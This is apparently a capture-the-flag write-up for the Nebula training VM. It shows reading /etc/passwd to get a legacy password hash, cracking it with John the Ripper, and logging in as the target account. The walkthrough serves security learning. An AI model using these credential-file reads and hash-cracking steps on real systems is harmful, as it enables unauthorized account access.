When we look at this challenge, it tells us that the credentials are stored on a legacy unix system. This is a red flag for passwords with weak encryption, or just locally stored passwords. I checked the challenge directory, however I found nothing of importance.
In linux, passwords are stored in the "/etc/passwd" file. Let's see if we can't see the password for the flag06 user.

```
$ cat /etc/passwd | grep flag06
flag06:ueqw0CnSGdsuM:933:933""/home/flag06:/bin/sh
```

So looking at this, we have the password hash. Now we just need to decrypt the hash. Since it is an old system, there might be an online tool you can use to crack it. I used a tool called John the Ripper (JTR), on my host machine. I have another writeup about how to use JTR on my github (link below), however I laid out my steps to crack the hash below.
https://github.com/guyinatuxedo/projects/tree/master/john_the_ripper

Install JTR
```
$ sudo apt-get install John
```

Create file with password hash, run JTR against file, then print cracked hash
```
$ touch passwords
$ echo ueqw0CnSGdsuM > passwords
$ sudo john passwords
```

After a couple of minutes, JTR should be done running and we can view the passwords.
```
sudo john passwords --show
?:hello

1 password hash cracked, 0 left
```

And we can see JTR cracked the password, which is "hello". Let's try to login to flag06 with that password on the nebula vm.

```
$ su flag06
Password: hello
sh-4.2$ /bin/getflag
You have successfully executed getflag on a target account
```

And just like that, we pwned the program.
